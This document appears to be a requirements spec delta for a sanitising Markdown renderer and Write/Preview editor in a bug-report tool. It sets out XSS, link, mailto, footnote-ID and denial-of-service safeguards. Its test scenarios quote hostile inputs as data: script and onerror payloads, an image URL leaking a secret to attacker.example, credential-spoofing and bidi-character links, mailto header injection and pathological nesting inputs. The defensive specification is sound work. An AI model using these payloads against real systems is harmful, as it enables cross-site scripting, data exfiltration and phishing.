# Spec Delta

## Purpose

Defines one safe, GitHub-flavoured Markdown display and Write/Preview editing behavior shared by every role that shows Reporter-authored text, so all roles see the same output.

## ADDED Requirements

### Requirement: MDR-01 Supported Markdown subset

The renderer SHALL display headings, paragraphs, emphasis, strikethrough, ordered and unordered lists, blockquotes, inline code, fenced code blocks, tables, thematic breaks, links and autolinks using GitHub-flavoured Markdown semantics. Task-list items SHALL render as disabled checkboxes that cannot be toggled. Headings SHALL NOT receive generated element IDs.

#### Scenario: Common report formatting
- **WHEN** source contains a heading, a numbered list, a fenced code block and a two-column table
- **THEN** each renders as the corresponding semantic element
- **AND** code block content is shown verbatim, without interpreting Markdown inside it

#### Scenario: Task list is not interactive
- **WHEN** source contains `- [x] done` and `- [ ] todo`
- **THEN** two disabled checkboxes render and clicking them changes neither the display nor the source

### Requirement: MDR-02 Raw HTML is never interpreted

Raw HTML in the source, inline or as a block, SHALL NOT create DOM elements, attributes or event handlers. It SHALL be displayed as literal text.

#### Scenario: Script and event-handler markup
- **WHEN** source contains `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` and `<iframe src="https://example.com">`
- **THEN** no script, img or iframe element exists in the rendered output, and no handler runs
- **AND** the markup appears as visible literal text

### Requirement: MDR-03 Images are never loaded

Markdown image syntax SHALL NOT produce an image element or any network request. The renderer SHALL show the image's alt text as plain text.

#### Scenario: Image used to exfiltrate data
- **WHEN** source contains `![logo](https://attacker.example/p.png?leak=secret)`
- **THEN** no img element is rendered and no request is made to that URL
- **AND** the text `logo` is shown

### Requirement: MDR-04 Restricted links

Only absolute `http:`, `https:` and `mailto:` URLs SHALL render as links, each with `rel="noopener noreferrer nofollow"`. The only exception is a footnote link under MDR-08. Every other scheme, relative URL or fragment SHALL render as its plain link text without a link element.

#### Scenario: Allowed link
- **WHEN** source contains `[docs](https://example.com/a)`
- **THEN** a link to `https://example.com/a` renders with the required `rel` value

#### Scenario: Dangerous or relative link
- **WHEN** source contains links using `javascript:`, `data:`, `vbscript:`, `file:` or a relative path, in any letter case or with leading whitespace
- **THEN** no link element is rendered and only the link text is shown

### Requirement: MDR-09 Link destination hardening

An otherwise allowed link SHALL render as plain link text when its URL contains a username or password. A `mailto:` link's `href` SHALL contain only `mailto:` and exactly one address. Any query (such as `subject`, `body`, `cc` or `bcc`) and any fragment SHALL be removed.

#### Scenario: Credentials in a link
- **WHEN** source contains `[a](https://user:pass@evil.example/)`, `[b](https://good.example@evil.example/)` and `[c](https://good.example&#64;evil.example/)`
- **THEN** none renders as a link element, and the link text is shown

#### Scenario: Prefilled email
- **WHEN** source contains `[mail](mailto:dev@example.com?cc=boss@example.com&body=hi#x)`
- **THEN** the link's `href` is exactly `mailto:dev@example.com`, with the required `rel`

### Requirement: MDR-11 Mailto address validation

A `mailto:` link SHALL render as plain text when its address, after percent-decoding once, contains `?`, `#`, `&`, a comma, a semicolon, whitespace, `<`, `>`, `"`, `\`, `/`, a control character, or anything other than exactly one `@`.

#### Scenario: Encoded header characters or several recipients
- **WHEN** source contains `[a](mailto:a@b.example%3Fcc=c@d.example)`, `[b](mailto:a@b.example%23x)`, `[c](mailto:a@b%0Abcc:x@y.example)`, `[d](mailto:%3Fbody=hi)` and `[e](mailto:a@b.example,c@d.example)`
- **THEN** none renders as a link element, and the link text is shown

#### Scenario: Other recipient separators and malformed addresses
- **WHEN** source contains `[a](mailto:a@b.example;c@d.example)`, `[b](mailto:a@b.example%3Bc@d.example)`, `[c](mailto:a@b.example%20c@d.example)`, `[d](mailto:a@b@c.example)`, `[e](mailto:a@b.example%3E%3Cc@d.example)` and `[f](mailto:nobody)`
- **THEN** none renders as a link element, and the link text is shown

### Requirement: MDR-12 Suspicious link characters render as text

An otherwise allowed link SHALL render as plain link text when its destination, after percent-decoding once, contains a Unicode format character (such as U+200B or U+202E), U+2028, U+2029, or any non-ASCII whitespace including U+00A0. A `mailto:` link SHALL also render as plain text when a `%` remains after one decode, or when its address uses any character outside ASCII letters, digits and `.!$'*+-=^_`{|}~` before the `@`, or outside ASCII letters, digits, `.` and `-` after it.

#### Scenario: Invisible or direction-changing characters
- **WHEN** source contains `[a](https://exa%E2%80%8Bmple.com/)`, `[b](https://example.com/%E2%80%AEfdp.exe)`, `[c](mailto:a%E2%80%8B@b.example)` and `[d](https://example.com/a%E2%80%A8b)`
- **THEN** none renders as a link element, and the link text is shown

#### Scenario: Suspicious mailto addresses
- **WHEN** source contains `[a](mailto:a%A0b@c.example)`, `[b](mailto:a@b.example%253Fcc=x)`, `[c](mailto:a@b%C3%BCcher.example)` and `[d](mailto:a(b)@c.example)`
- **THEN** none renders as a link element, and the link text is shown

#### Scenario: Ordinary links are unaffected
- **WHEN** source contains `[a](https://example.com/path?q=1#frag)`, `[b](https://bücher.example/)` and `[c](mailto:Dev.Name+tag@Example.com)`
- **THEN** each renders as one link with the required `rel`

### Requirement: MDR-08 GitHub-style footnotes

The renderer SHALL support GFM footnotes as GitHub does. References and definitions SHALL be linked both ways through same-page fragment links. Every element ID the renderer generates SHALL start with `user-content-` and SHALL be unique to its view instance. A fragment link SHALL render as a link only when it targets a `#user-content-` ID generated in the same view.

#### Scenario: Footnote reference and back-reference work
- **WHEN** source contains `Fails on login[^1].` and `[^1]: Only on Chrome.`
- **THEN** the reference is a link whose `#` target is the ID of the definition element, and that ID starts with `user-content-` and ends with `fn-1`
- **AND** the definition has a back-link to the reference, whose element ID also starts with `user-content-`

#### Scenario: Two views on one page never share IDs
- **GIVEN** two views on the same page, each rendering `Note[^1]` and `[^1]: text`
- **WHEN** both are displayed
- **THEN** no `id` value appears twice in the page
- **AND** each view's footnote links target only IDs inside that same view

#### Scenario: Every generated ID is prefixed
- **WHEN** source contains footnotes named `1`, `note` and `__proto__`
- **THEN** every `id` attribute in the rendered output starts with `user-content-`

#### Scenario: Author-written fragment links stay plain text
- **WHEN** source contains `[x](#top)`, `[y](#user-content-fn-missing)` and `[z](#USER-CONTENT-fn-1)`
- **THEN** none renders as a link element, and their link text is shown

### Requirement: MDR-05 Failure-safe rendering

When source cannot be rendered, for example because of pathological nesting, the renderer SHALL display the complete source as escaped plain text instead of failing, hiding content or freezing the page.

#### Scenario: Pathological input
- **WHEN** source is 20,000 characters of nested blockquote and list markers
- **THEN** the view finishes rendering in under one second in the test environment, either formatted or as escaped plain text
- **AND** surrounding page content remains usable

#### Scenario: Known slow constructs up to 20,000 characters
- **WHEN** source is at most 20,000 characters of any of the following:
  - deep nesting behind a footnote definition (`x[^a]\n\n[^a]: ` followed by repeated `> - `, or repeated `[^a]: - `);
  - a table whose header is thousands of columns wide, followed by thousands of short rows;
  - long runs or a high density of emphasis delimiters (`*`, `_`, `*_`);
  - thousands of setext headings (`a\n=\n` repeated);
  - thousands of lazy blockquote continuation lines (`>a\nb\n` repeated);
- **THEN** each finishes rendering in under one second without exhausting memory, either formatted or as the complete source in escaped plain text
- **AND** ordinary reports, including a modest table and normal emphasis, still render formatted

### Requirement: MDR-10 Off-main-thread parsing with a time limit

Where the browser provides Web Workers, Markdown SHALL be parsed in a worker, never on the page's main thread. Until a result arrives the view SHALL show the complete source as escaped plain text. A parse that hasn't finished within 1 second SHALL be abandoned, its worker terminated, and the plain text kept. Formatted output SHALL be rendered with the same safety rules as MDR-01..04, 08 and 09.

#### Scenario: Slow parse is abandoned
- **GIVEN** the worker does not answer for a source
- **WHEN** 1 second passes
- **THEN** the view still shows the complete source as escaped plain text, the worker has been terminated, and no formatted output appears later for that source

#### Scenario: Main thread never parses
- **WHEN** a view renders any source in an environment with Web Workers
- **THEN** the Markdown parser is not called on the main thread
- **AND** the first render shows the complete source as plain text without waiting for the worker

#### Scenario: Formatted result replaces the plain text
- **GIVEN** the worker returns a result for the current source within 1 second
- **WHEN** it arrives
- **THEN** the view shows the formatted output, with the same DOM as the in-thread renderer for that source, and the safety rules still apply

#### Scenario: One slow report does not break others
- **GIVEN** two views share a worker, and the first view's parse times out
- **WHEN** the worker is terminated
- **THEN** the second view's pending parse is retried once on a fresh worker and can still show formatted output

#### Scenario: Stale result is ignored
- **GIVEN** a view's source changes while an earlier parse is pending
- **WHEN** the earlier result arrives
- **THEN** it is discarded and only the result for the current source is shown

#### Scenario: No Web Worker available
- **WHEN** the environment has no Web Worker, such as the test runner or server rendering
- **THEN** the view parses in-thread behind the MDR-05 pre-check and error boundary, and MDR-01..09 behave as specified

### Requirement: MDR-06 Write and Preview editing

The editor SHALL offer accessible Write and Preview tabs. Write SHALL edit the raw source. Preview SHALL render the current source with the same renderer and settings used by every role's display. Switching tabs SHALL never modify the source. An empty source SHALL preview as "Nothing to preview".

#### Scenario: Preview matches what other roles see
- **GIVEN** a Reporter types source S in Write
- **WHEN** they switch to Preview
- **THEN** the preview output equals the output of the shared display for S
- **AND** switching back to Write shows S unchanged, with the cursor in the textarea

#### Scenario: Keyboard and screen-reader access
- **WHEN** a keyboard user moves between the tabs
- **THEN** the tabs expose tab and tabpanel roles, the selected state, and are operable with arrow keys and Enter/Space

### Requirement: MDR-07 Consistent rendering across roles

Every Reporter, Developer and Maintainer view that displays a report's Reporter-authored `description` SHALL use the shared renderer. Titles and all other text SHALL remain escaped plain text.

#### Scenario: Same source, same output in every role
- **GIVEN** a report whose description contains a list, a table and `<b>x</b>`
- **WHEN** the Maintainer browser and the Developer description panel display it
- **THEN** both show the same formatted list and table, and the literal text `<b>x</b>`

#### Scenario: Title stays plain text
- **WHEN** a title contains `**bold**`
- **THEN** every role shows the literal asterisks
